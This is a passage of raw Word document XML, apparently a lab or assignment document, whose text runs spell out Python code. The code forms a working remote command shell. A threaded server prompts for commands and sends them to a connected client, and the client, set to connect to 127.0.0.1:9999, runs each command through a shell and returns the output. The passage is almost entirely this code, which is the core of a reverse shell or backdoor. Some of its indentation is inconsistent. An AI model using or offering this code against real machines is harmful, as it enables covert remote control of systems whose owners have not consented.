        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(f"[+] Connection established with {addr[0]}:{addr[1]}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F597F69" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    while True:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3779CFB0" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57216608" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">            command = input(f"{addr[0]}@shell&gt; ")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37542B9B" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">            if command.lower() == 'quit':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3319A5F6" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">                conn.send(command.encode())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A00A13C" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">                conn.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="053676F5" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">                break</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="157E47BC" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">            if command.strip():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2892A9A7" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">                conn.send(command.encode())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D83218B" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">                response = conn.recv(4096).decode()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AAA9BF9" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">                print(response)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E2E8E6E" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        except Exception as e:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B1AC5D0" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">            print(f"[!] Error: {e}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D238AB7" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">            conn.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="178D5344" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">         break</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23C027CE" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DC3C3FC" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>def start_server():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A424C39" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    server = create_server_socket()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C7310F4" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    while True:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="455E505C" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        conn, addr = server.accept()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E3DAC97" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        client_thread = threading.Thread(target=handle_client, args=(conn, addr))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F130E86" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        client_thread.start()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0920F337" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>if __name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="501F31DD" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    start_server()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57C8BD8E" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Client:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B1CDB5C" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>import socket</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D182C0B" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>import subprocess</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="135E70C0" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>import os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2918258E" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>host = '127.0.0.1'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E658E15" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>port = 9999</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="390878C5" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>def connect_to_server():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="150DFFCD" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="551B13F8" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    client.connect((host, port))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AD9E94A" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    while True:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64D76757" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36A45BEF" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">            command = client.recv(1024).decode()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A67A5CE" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">            if command.lower() == 'quit':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5550C2B3" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">                break</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="164A3854" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">            elif command.startswith('cd '):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="385FA630" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">                try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="487757B4" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">                    os.chdir(command[3:].strip())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="256C6D2F" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">                    output = f"Changed directory to {os.getcwd()}"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BA560EA" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">                except Exception as e:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2283DDBB" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">                    output = str(e)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37DE17EA" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E4842B3" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">            else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1533ACF0" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A7E39D7" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">                output = process.stdout.read() + process.stderr.read()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="577DF852" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">                output = output.decode()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16AC4E83" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">            current_dir = os.getcwd() + "&gt; "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B4CC091" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">            client.send((output + "\n" + current_dir).encode())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A8477BA" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        except Exception as e:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46F220EB" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">            client.send(str(e).encode())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51E5A512" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">            break</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71FA8B3D" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    client.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33BC8BFC" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>if __name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="635320E1" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    connect_to_server()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07214BE2" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
